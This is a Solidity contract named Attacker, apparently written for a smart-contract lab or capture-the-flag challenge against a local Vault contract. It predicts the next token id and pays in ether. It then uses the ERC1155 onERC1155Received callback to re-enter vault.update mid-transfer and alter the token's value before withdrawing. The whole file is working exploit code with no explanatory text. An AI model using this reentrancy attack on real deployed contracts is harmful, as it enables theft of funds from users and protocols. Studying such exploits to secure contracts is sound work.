// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./vault.sol";

import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";



contract Attacker is IERC1155Receiver  {
    
    Vault vault;

    constructor(address vault_address) payable{
        vault = Vault(vault_address);
    }

    uint256 target_id = 1000; // id start with 0

    uint256 counter = 0;


    function attack() external returns(uint256){

        uint256 id = vault.create(1, 10);

        target_id = id+1;

        uint256 ret_id = vault.create(1000, 1);

        require(target_id == ret_id, "reentrancy unsuccess");


        // return vault.getRquire(target_id);
        vault.pay_eth{value: 1 ether + 1}(target_id);

        vault.withdraw(target_id); 
        return ret_id;
    }

    function onERC1155Received(
        address ,
        address ,
        uint256 id,
        uint256 ,
        bytes calldata 
    ) external override returns (bytes4) {
        counter++;
        if(target_id == id && counter == 2){
            uint256 updated_id = vault.update(target_id, 1, 1e18);
            require(target_id == updated_id, "updated value of different token id");
        }
    

        return this.onERC1155Received.selector;
    }  


     function onERC1155BatchReceived(
        address ,
        address ,
        uint256[] calldata ,
        uint256[] calldata ,
        bytes calldata 
    ) external pure override returns (bytes4) {

        return this.onERC1155BatchReceived.selector;
    }

    receive() external payable {}



    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId || 
           interfaceId == type(IERC165).interfaceId;
    }

}
